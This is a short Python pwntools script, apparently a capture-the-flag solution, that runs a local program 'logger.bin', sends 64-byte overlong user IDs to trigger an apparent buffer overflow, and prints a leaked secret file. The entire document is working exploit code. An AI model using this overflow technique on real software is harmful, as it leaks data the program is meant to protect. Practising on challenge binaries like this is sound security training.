#!/usr/bin/python3
from pwn import *

def exploit():
  try:  
      p = process("./logger.bin")

      for i in range(6):
          p.recvline(timeout=1)
      p.recvuntil(b"Welcome! Please input your ID: ", timeout=1)
      p.sendline(b"a"*64)
      p.recvuntil(b"Recorded your last login time!")
      p.recvuntil(b"Do you want to check other user's login record? (Y/N):", timeout=1)
      p.sendline(b"Y")
      p.recvuntil(b"Input the user ID you want to check:", timeout=1)
      p.sendline(b"a"*64)
      
      secret_file= p.recvall(timeout=1).decode('utf-8').strip()
      print(secret_file.split("\n"))
    
  except EOFError:
     print("")
  except Exception as e:
     print("Error: %s " %e)
if __name__ == "__main__":
    exploit()
